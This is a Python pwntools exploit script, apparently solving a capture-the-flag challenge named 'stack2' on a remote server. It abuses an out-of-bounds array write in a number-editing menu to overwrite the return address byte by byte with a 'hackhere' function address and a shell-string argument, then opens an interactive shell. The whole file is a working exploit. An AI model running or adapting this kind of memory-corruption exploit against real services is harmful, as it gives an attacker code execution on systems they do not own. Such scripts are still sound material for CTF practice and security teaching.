from pwn import *

context(arch="i386", os="linux", log_level="debug")
context.binary = "stack2"


# io = process("./stack2")
# gdb.attach(io)
io = remote("111.198.29.45", 49327)

io.recvuntil("have:\n")
io.sendline(str(1))
io.recvuntil("numbers\n")
io.sendline(str(1))

# hackhere = p32(ELF("./stack2").sym["hackhere"])
hackhere = p32(0x08048450)

for i in range(4):
    io.recvuntil("5. exit\n")
    io.sendline(str(3))
    io.recvuntil("to change:\n")
    io.sendline(str(116+i+16))
    io.recvuntil("new number:\n")
    io.sendline( str(hackhere[i]) )
    print(str(hackhere[i]))

# binsh = "/bin/sh\0".encode("ascii")
# print("binsh；")
# print(binsh)
# # 写入字符串
# for i in range(8):
#     io.recvuntil("5. exit\n")
#     io.sendline(str(3))
#     io.recvuntil("to change:\n")
#     io.sendline(str(128+i+16))
#     io.recvuntil("new number:\n")
#     io.sendline(str(binsh[i]))

# 写入参数地址

binshaddr = p32(0x08048987)

for i in range(4):
    io.recvuntil("5. exit\n")
    io.sendline(str(3))
    io.recvuntil("to change:\n")
    io.sendline(str(124+i+16))
    io.recvuntil("new number:\n")
    io.sendline(str(binshaddr[i]))


io.recvuntil("5. exit\n")
io.sendline(str(5))

io.interactive()
